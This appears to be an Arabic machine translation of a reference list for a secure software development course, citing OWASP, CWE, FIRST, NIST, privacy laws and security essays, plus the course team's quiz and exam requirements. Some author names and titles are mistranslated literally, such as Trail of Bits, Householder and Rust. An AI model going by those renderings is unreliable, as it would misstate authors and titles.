Enosuchblog ، 2022-12-28 ، "نقاط الضعف "ReDoS" والحوافز المنحرفة" ، <https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives>

تمكين مشاركة الموارد عبر الأصل ([https://enable-cors.org/](https://enable-cors.org/))

Flatt Security Inc,, "العثور على حقن SQL غير مرئي عن طريق تجاوز وظائف الهروب في mysqljs / mysql", 2022-02-21, (<https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4>)

منتدى فرق الاستجابة للحوادث والأمن  (FIRST) ، *إطار خدمات FIRST* ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

منتدى فرق الاستجابة للحوادث والأمن (FIRST) ، *إطار خدمات فريق الاستجابة لحوادث أمن المنتجات (PSIRT) * ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

منتدى فرق الاستجابة للحوادث والأمن (FIRST) ، *إطار خدمات فريق الاستجابة لحوادث أمن الكمبيوتر (CSIRT) * ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

منتدى فرق الاستجابة للحوادث والأمن (FIRST) ، *المبادئ التوجيهية والممارسات لتنسيق نقاط الضعف متعددة الأطراف والكشف عنها *، ([https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1))

منتدى فرق الاستجابة للحوادث والأمن (FIRST) ، *بروتوكول إشارات المرور (TLP) * ([https://www.first.org/tlp/](https://www.first.org/tlp/))

فريدل ، جيفري إي إف * ، إتقان التعبيرات العادية* ، الطبعة 3 ، أورايلي ميديا ، ISBN 9780596528126 ، 2006-08 ([https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/))

Garavel، Hubert، et al*، الطرق الرسمية لأنظمة الكمبيوتر الآمنة والمأمونة، *دراسة BSI 875، 2013 ([https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1))

جورجييف ، مارتن. إيينجار ، سوبود ؛ جانا ، سومان. أنوبهاي ، ريشيتا. بونيه ، دان. شماتيكوف ، فيتالي ؛ *أخطر رمز في العالم: التحقق من صحة شهادات SSL في البرامج غير المستعرضة *، 2012 ([https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf))

جيران ، أندرو  ، *مدونة Go: معالجة الأخطاء والذهاب *، 2011 ([https://blog.golang.org/error-handling-and-go](https://blog.golang.org/error-handling-and-go))

GitHub Security, *رسائل البريد الإلكتروني لإعادة تعيين كلمة المرور التي تم تسليمها إلى عنوان خاطئ*, 2016-07-05 ([https://bounty.github.com/researchers/jagracey.html](https://bounty.github.com/researchers/jagracey.html))

جيت لاب، *ما هو جيت أوبس؟ * ([https://about.gitlab.com/topics/gitops/])

جودين ، دان ، 2015 ، "كان ينظر إليه مرة واحدة على أنه مضاد للرصاص ، 11 مليون + كلمات مرور آشلي ماديسون متصدعة بالفعل" * ، Ars Technica* ، <https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/>

جودينج ، دان * ، نهب مفاتيح التشفير من SGX فائق الأمان يرسل Intel يتدافع مرة أخرى ، *Ars Technica ، 2020-06-09 ([https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/))

جوجل، مشروع OSS-Fuzz ([https://github.com/google/oss-fuzz](https://github.com/google/oss-fuzz))

غرينوالد ، جلين  ، *لماذا الخصوصية مهمة *، 2014 ([https://www.ted.com/talks/glenn_greenwald_why_privacy_matters](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) أو [https://www.youtube.com/watch?v=pcSlowAhvUk](https://www.youtube.com/watch?v=pcSlowAhvUk))

هيرنان ، شون ؛ لامبرت ، سكوت ؛ أوستوالد ، توماش ؛ شوستاك ، آدم * ، نمذجة التهديد: كشف عيوب التصميم الأمني باستخدام نهج STRIDE *، 2006 ([https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx))

صاحب المنزل ، ألين * ، دليل CERT للإفصاح المنسق عن الثغرات الأمنية *، 2019 ([https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure))

هوبارد ، دوغلاس * ، فشل إدارة المخاطر: لماذا تم كسرها وكيفية إصلاحها ، *جون وايلي وأولاده. ص. 46 ، 2009 ([https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536))

IETF RFC 1983، *مسرد مصطلحات مستخدمي الإنترنت*  ([https://tools.ietf.org/html/rfc1983](https://tools.ietf.org/html/rfc1983))

IETF RFC 3986*، معرف الموارد الموحد (URI): بناء الجملة العام (*[https://tools.ietf.org/html/rfc3986](https://tools.ietf.org/html/rfc3986))

IETF RFC 5321، القسم 2.3.11، *صندوق البريد والعنوان* ([https://tools.ietf.org/html/rfc5321#section-2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11))

مكتب مفوض المعلومات (ICO) ، *دليل اللائحة العامة لحماية البيانات (GDPR) * ([https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/))

الرابطة الدولية لمحترفي الخصوصية (IAPP) ، *ماذا تعني الخصوصية؟ * ([https://iapp.org/about/what-is-privacy/](https://iapp.org/about/what-is-privacy/))

ISO / IEC 9899: 2018 ، *لغات البرمجة - C* (المعروف أيضا باسم "C17").  هذا المعيار غير متاح للجمهور ؛ مسودتها النهائية متاحة للجمهور على ([https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf))

ISO/IEC 15026-2:2011، * هندسة النظم والبرمجيات - ضمان النظم والبرمجيات - الجزء 2: حالة الضمان* ([https://www.iso.org/standard/52926.html](https://www.iso.org/standard/52926.html))

كابلان موس ، يعقوب * ، ليس كل المهاجمين متساوين: فهم ومنع DOS في تطبيقات الويب *، 2020 ([https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/))

kernel.org ، *نمط ترميز نواة لينكس* ([https://www.kernel.org/doc/Documentation/process/coding-style.rst](https://www.kernel.org/doc/Documentation/process/coding-style.rst))

ليفين, راف*, مع سلوك غير محدد, كل شيء ممكن, *2018-08-17, ([https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html))

مؤسسة لينكس * ، فهم تكنولوجيا المصدر المفتوح وضوابط التصدير الأمريكية ، *2021-07-19 ، <https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/>)

لوكيدس، مايك، *إعادة النظر في "ما هو DevOps"،* 2014-06-30 ([http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html))

ماك كارثاي ، كولم * ، الاستدلال الآلي وأمازون s2n *، 2016-09-08 ([https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/))

مايكروسوفت ، *تسمية الملفات والمسارات ومساحات الأسماء* ([http://msdn.microsoft.com/en-us/library/aa365247.aspx](http://msdn.microsoft.com/en-us/library/aa365247.aspx))

مايكروسوفت، *نمذجة التهديدات* ([https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling))

مايكروسوفت * ، نقاط الضعف في التوقيت مع فك التشفير المتماثل في وضع CBC باستخدام الحشو* ، 2020-07-15 ([https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode))

مايكروسوفت ، "3 طرق للتخفيف من المخاطر عند استخدام موجزات الحزم الخاصة" ، (<https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/>)

مينوتشا ، شرياس ، *التعبيرات العادية للقوم العاديين* ([https://refrf.shreyasminocha.me/](https://refrf.shreyasminocha.me/))

ميتشل ، توم ، 1997 ، *التعلم الآلي*. نيويورك: ماكجرو هيل. ردمك 0-07-042807-7. OCLC 36417892.

ميتري ([https://www.mitre.org/](https://www.mitre.org/))

ميتري ، تعداد الضعف المشترك (CWE) ([https://cwe.mitre.org/](https://cwe.mitre.org/))

MITRE, تعداد الضعف الشائع * (CWE)، 2019 CWE أخطر 25 أخطاء برمجية* ([https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html))

Mozilla، *تقاسم الموارد عبر المنشأ (CORS) * ([https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS))

موزيلا ويكي ، *الأكسدة* ([https://wiki.mozilla.org/Oxidation](https://wiki.mozilla.org/Oxidation))

موزيلا ويكي ، *الأمن / الخادم TLS* ([https://wiki.mozilla.org/Security/Server_Side_TLS](https://wiki.mozilla.org/Security/Server_Side_TLS))

موزيلا ، الصدأ مقابل C ++ في macOS فايرفوكس ليلا ([https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479))

موزيلا، *سياسة المنشأ نفسه* ([https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy))

قاعدة بيانات الضعف الوطنية (NVD), CVE-2021-44228, (<https://nvd.nist.gov/vuln/detail/CVE-2021-44228>)

نيوكومب ، كريس ؛ راث ، تيم ؛ تشانغ ، فان ؛ مونتيانو ، بوجدان. بروكر ، مارك. Daerdeuff, Michael, *استخدام الأساليب الرسمية في Amazon Web Services*, 2014-09-29 ([https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf))

نيوكومب ، كريس ؛ راث ، تيم ؛ تشانغ ، فان ؛ مونتيانو ، بوجدان. بروكر ، مارك. Daerdeuff، مايكل، *كيف تستخدم Amazon Web Services الأساليب الرسمية*، اتصالات ACM، المجلد 58 رقم 4، الصفحات 66-73، 10.1145/2699417، 2015-04 ([https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext))

نيكولاي ، ماريا إيرينا ، ماتيو سين ، مينه نجوك تران ، بيت بوسير ، أمبريش راوات ، مارتن ويستوبا ، فالنتينا زانتيديسكي ، ناتالي باراكالدو ، براينت تشين ، هايكو لودفيج ، إيان إم مولوي ، بن إدواردز ،
صندوق أدوات متانة الخصومة v1.0.0
2019-11-15<https://arxiv.org/abs/1807.01069>

الموقع الرسمي للاتحاد الأوروبي لنص اللائحة العامة لحماية البيانات ([https://eur-lex.europa.eu/eli/reg/2016/679/oj](https://eur-lex.europa.eu/eli/reg/2016/679/oj))

أوم ، مارك ؛ لوحة ، هنريك. سيكوش ، أرنولد ؛ ماير ، ميشال * ، مجموعة سكاكين Backstabber: مراجعة لهجمات سلسلة توريد البرامج مفتوحة المصدر *، 2020-05-19 ([https://arxiv.org/abs/2005.09535](https://arxiv.org/abs/2005.09535))

مؤسسة أمان المصدر المفتوح (OpenSSF) ، *برنامج شارة أفضل الممارسات OpenSSF* ([https://bestpractices.coreinfrastructure.org/en](https://bestpractices.coreinfrastructure.org/en))

مؤسسة أمان المصدر المفتوح (OpenSSF) ، *أمان BadgeApp: حالة الضمان الخاصة به* ([https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md))

مؤسسة أمن المصادر المفتوحة (OpenSSF) ، مجموعة عمل الكشف عن الثغرات الأمنية ([https://github.com/ossf/wg-vulnerability-disclosures](https://github.com/ossf/wg-vulnerability-disclosures))

مجموعة عمل الكشف عن الثغرات الأمنية التابعة لمؤسسة أمن المصادر المفتوحة (OpenSSF) ، دليل الكشف المنسق عن الثغرات الأمنية لمشاريع البرمجيات مفتوحة المصدر ([https://github.com/ossf/oss-vulnerability-guide](https://github.com/ossf/oss-vulnerability-guide))

مشروع أمان تطبيق الويب المفتوح  (OWASP) ، *OWASP أهم 10 مخاطر لأمن تطبيقات الويب* ([https://owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten))

افتح مشروع أمان تطبيق الويب (OWASP) ، OWASP *Mobile Top 10* ([https://owasp.org/www-project-mobile-top-10/](https://owasp.org/www-project-mobile-top-10/))

مشروع أمان تطبيق الويب المفتوح (OWASP) ، *مشروع OWASP لإنترنت الأشياء* ([https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project))

مشروع أمان تطبيق ويب المفتوح (OWASP) ، *التعبير العادي رفض الخدمة - ReDoS* ([https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS))

مشروع أمان تطبيق الويب المفتوح  (OWASP) ، *OWASP XML الكيانات الخارجية (XXE*) (([https://owasp.org/www-مشروع-توب-عشرة/2017/A4_2017-XML_External_Entities_(XXE).html]https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html))

فتح مشروع أمان تطبيق الويب (OWASP) وعمليات *إعادة التوجيه التي لم يتم التحقق من صحتها وإعادة توجيه ورقة الغش* ([https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html))

مشروع أمان تطبيق الويب المفتوح (OWASP) ، *ورقة الغش في الكشف عن الثغرات الأمنية* ([https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

Qualys ، *اختبار خادم SSL* ([https://www.ssllabs.com/ssltest/](https://www.ssllabs.com/ssltest/))

Patchstack ، 2022 ، حالة أمان WordPress في عام 2021 ([https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/]( https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/))

بترو ، دان وألان سيسيل ، 2021 ، أنت تفعل إنترنت الأشياء RNG ، DEF CON 29 ([https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng)) مع عرض تقديمي في [https://www.youtube.com/watch?v=Zuqw0-jZh9Y](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)

، 2016-04-19 ، "الكشف عن استخدام" curl | باش "جانب الخادم" ، idontplaydarts.com ، <https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/>

معهد بونيمون ذ.م.م، *تكاليف وعواقب الثغرات في استجابات الضعف*، 2019 ([https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html))

PostgreSQL  ، *PostgreSQL 14* ، "وظائف تنفيذ الأوامر" ،
(<https://www.postgresql.org/docs/current/libpq-exec.html>).


روبرت ، الكسندر. تشا ، سانغ كيل ؛ أفجيرينوس ، ثاناسيس ؛ فوت ، جوناثان. وارن ديفيد; جريكو ، غوستافو ؛ بروملي ، ديفيد * ، تحسين اختيار البذور للتزعج *، 2014 ([https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf))

ريد هات ، *ما هو DevSecOps؟ * ([https://www.redhat.com/en/topics/devops/what-is-devsecops](https://www.redhat.com/en/topics/devops/what-is-devsecops))

ريد هات ، *ما هو جيتوبس؟ * ([https://www.redhat.com/en/topics/devops/what-is-gitops])

Regehr، جون، *دليل للسلوك غير المحدد في C و C ++ (الأجزاء 1-3)، *2010 ([http://blog.regehr.org/archives/213](http://blog.regehr.org/archives/213))

ريتشل, روبرت, *نموذج كيف نهدد*, 2020-09-02 ([https://github.blog/2020-09-02-how-we-threat-model/](https://github.blog/2020-09-02-how-we-threat-model/))

مشروع البنيات القابلة للتكرار ، "التعاريف" ، (<https://reproducible-builds.org/docs/definition/>)

ريتشي ، ديان ، "اتجاهات خرق البيانات: ماذا تفعل بعد الهجوم"  ، *مجلة الأمن ، *2015-02-01 ، <https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack>

روجرز ، توني * ، الأكاذيب يؤمن المبرمجون بالأسماء - مع أمثلة *، 2018 ([https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/))

Romailler ، Yolan ، *الدليل النهائي ل "تحيز Modulo وكيفية تجنبه"! * (<https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/>)

رويس ، ونستون دبليو * ، إدارة تطوير الأنظمة الكبيرة: المفاهيم والتقنيات *، 1970 ([https://dl.acm.org/doi/10.5555/41765.41801](https://dl.acm.org/doi/10.5555/41765.41801))

لغة برمجة الصدأ ، *أخطاء قابلة للاسترداد مع النتيجة* ([https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html))

مواد التدريب SAFECode ([https://safecode.org/training/](https://safecode.org/training/))

SAFECode*، مبادئ تقييم ضمان البرمجيات*، 2019 ([https://safecode.org/principles-of-software-assurance-assessment/](https://safecode.org/principles-of-software-assurance-assessment/))

سالتزر ، جيروم ه. ، شرودر ، مايكل د. * ، حماية المعلومات في أنظمة الكمبيوتر *، 1975 ([http://web.mit.edu/Saltzer/www/publications/protection/index.html](http://web.mit.edu/Saltzer/www/publications/protection/index.html))

سكانلون ، توماس * ، 10 أنواع من أدوات اختبار أمان التطبيقات: متى وكيف يتم استخدامها* ، مدونة معهد هندسة البرمجيات (SEI) ، 2018-07-09 ([https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html))

شناير ، بروس * ، أنا حول خرق Equifax: شهادة وبيان لسجل بروس شناير* ، جلسة استماع حول "تأمين بيانات ائتمان المستهلكين في عصر التجارة الرقمية" أمام اللجنة الفرعية للتجارة الرقمية وحماية المستهلك ، لجنة الطاقة والتجارة ، مجلس النواب الأمريكي ، 2017-11-01 ([https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html))

شناير، بروس*، عملية الأمن*، 2000 ([https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html))

شناير، بروس*، عقلية الأمن*، 2008-03 ([https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html))

شناير ، بروس * ، داخل العقل الملتوي لمحترف الأمن ، *سلكي ، 2008-03-20 ، [https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html](https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html)

موقع ويب رؤوس الأمان لاختبار الرؤوس على المواقع التي يمكن الوصول إليها بشكل عام ([https://securityheaders.com/](https://securityheaders.com/))

الأمن.txt ([https://securitytxt.org/](https://securitytxt.org/))

مختبرات الحارس ، "CVE-2021-45608 | NetUSB RCE عيب في الملايين من أجهزة توجيه المستخدم النهائي" ([https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/))

شاهين ، مجتبى; بابار, محمد علي; Zhu ، Liming * ، التكامل المستمر والتسليم والنشر: مراجعة منهجية للنهج والأدوات والتحديات والممارسات ، *IEEE Access ، 2017 ([https://arxiv.org/abs/1703.07019](https://arxiv.org/abs/1703.07019))

شيفتشينكو ، ناتاليا * ، نمذجة التهديد: 12 طريقة متاحة *، 2018 ([https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html))

شو ، شياوكوي ؛ سيامبرون ، أندرو ؛ ياو ، دانفنغ * ، كسر الهدف: تحليل خرق البيانات المستهدفة والدروس المستفادة *، 2017-01-18 ([https://arxiv.org/pdf/1701.04940.pdf](https://arxiv.org/pdf/1701.04940.pdf))

سيم ، دارين * ، الثغرة الأمنية وتأثير أداء المتصفح على الهدف = "_blank" *، 2019-03-23 ([https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547))

سينغ ، أنيميش ، أنوباما مورثي ، وكريستيان كادنر ،
[دمج الهجمات العدائية في خط أنابيب تدريب نموذجي ](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/)،
2018-06-25

الإفصاح عن SSD ، استشارات SSD - نقاط الضعف في VestaCP LPE ، 2021-03-20 ، (<https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/>)

ولاية كاليفورنيا، *قانون حماية الخصوصية على الإنترنت في كاليفورنيا (OPPA*) لعام 2003 ([https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))

ولاية  كاليفورنيا ، *قانون حماية الخصوصية عبر الإنترنت في كاليفورنيا (OPPA) ، الفصل 22. متطلبات الخصوصية على الإنترنت [22575-22579]*, 2003 ([https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575))

ولاية كاليفورنيا، *قانون خصوصية المستهلك في كاليفورنيا (CCPA) *لعام 2018 ([https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5))

Stilgherrian * ، الاعتماد على مكافآت الأخطاء "إدارة المخاطر غير المناسبة": كاتي موسوريس *، 2019 ([https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/))

سريع ، *تسلسل اختياري* ([https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html))

تاباسي ، إلهام (NIST) ، كيفن بيرنز (MITRE) ، مايكل هادجيميشيل (MITRE) ، أندريس مولينا ماركهام (MITRE) ، جوليان سيكستون (MITRE) ،
تصنيف ومصطلحات التعلم الآلي العدائي
NISTIR 8269 (مسودة) ،
أكتوبر 2019<https://csrc.nist.gov/publications/detail/nistir/8269/draft>

مشروع الأزيز ([https://fuzzing-project.org/](https://fuzzing-project.org/))

مؤسسة لينكس  ، *ملخص مفاهيم الناتج المحلي الإجمالي لمشاريع البرمجيات المجانية والمفتوحة المصدر* ، 2018 ([https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf))

مؤسسة لينكس، *سياسة جمع بيانات القياس عن بعد واستخدامها*، 2019 ([https://www.linuxfoundation.org/telemetry-data-policy/](https://www.linuxfoundation.org/telemetry-data-policy/))

المجموعة المفتوحة ، معيار PO*SIX - تعريف متغير البيئة *، 2018 ([https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html))

توماس ، "أساطير حول / dev / urandom" ، (<https://www.2uo.de/myths-about-urandom>)

درب البتات  ، *على محمل الجد ، توقف عن استخدام RSA ،* 2019 ([https://blog.trailofbits.com/2019/07/08/fuck-rsa/](https://blog.trailofbits.com/2019/07/08/fuck-rsa/))

الأمم المتحدة*، العهد الدولي الخاص بالحقوق المدنية والسياسية، المادة 17، *1966 ([https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx))

مكتب نائب مساعد وزير الدفاع لهندسة النظم (OASD SE) التابع لوزارة الدفاع الأمريكية (DoD) ، *دليل إدارة المخاطر والقضايا والفرص لبرامج الاستحواذ الدفاعية *، 2017-01 ([http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf))

إطار عمل الأمن السيبراني للمعهد الوطني الأمريكي للمعايير والتكنولوجيا (NIST) ([https://www.nist.gov/cyberframework](https://www.nist.gov/cyberframework))

المعهد الوطني الأمريكي للمعايير والتكنولوجيا (NIST) ، قاعدة بيانات الضعف الوطنية (NVD) ([https://nvd.nist.gov/](https://nvd.nist.gov/))

*قانون الخصوصية الأمريكي لعام 1974 (5 U.S.C. 552a) (*[https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf))

VeraCode*, DAST TEST: فوائد اختبار DAST لأمن التطبيقات*, 2020 ([https://www.veracode.com/security/dast-test](https://www.veracode.com/security/dast-test))

مواصفات جلب WHATWG ([https://fetch.spec.whatwg.org/#http-extensions](https://fetch.spec.whatwg.org/#http-extensions))

ويلر ، ديفيد أ. * ، نموذج لنمط حالة ضمان الأمن ، *ورقة IDA P-9278 ، 2018-12 ([https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx))

ويلر ، ديفيد أ. * ، شارة أفضل ممارسات مبادرة البنية التحتية الأساسية (CII) في 2019 *، 2019-03-14 ([https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf))

ويلر ، ديفيد أ. * ، كيفية منع هارتبليد القادم *، 2020-07-18 ([https://dwheeler.com/essays/heartbleed.html](https://dwheeler.com/essays/heartbleed.html))

ويلر ، ديفيد أ. * ، ثغرة فشل Apple goto: الدروس المستفادة *، 2020-08-13 ([https://dwheeler.com/essays/apple-goto-fail.html](https://dwheeler.com/essays/apple-goto-fail.html))

ويلر ، ديفيد أ. ، "منع هجمات سلسلة التوريد مثل SolarWinds"  ، *مدونة مؤسسة Linux ، *2021-01-13 ، (<https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/>)

# متطلبات فريق التعليم

يحتاج فريق التعليم في LF إلى:

1. نظرة عامة على كل فصل في كل دورة من الدورات التدريبية الثلاثة جنبا إلى جنب مع أهداف التعلم {تم ذلك بالفعل أعلاه ؛ انظر النص بعد كل "العنوان 1")

2. الاختبارات المتدرجة في نهاية الفصل: 3-6 أسئلة ، ويفضل أن يكون أسلوب الاختيار من متعدد

3. الامتحان النهائي لكل من الدورات الثلاث: 15 سؤالا ، ويفضل أن يكون الاختيار من متعدد ، تختلف عن تلك الموجودة في اختبارات نهاية الفصل.

يتم تغطية البندين 2 و 3 في ملف منفصل ، لحماية سريتهما.

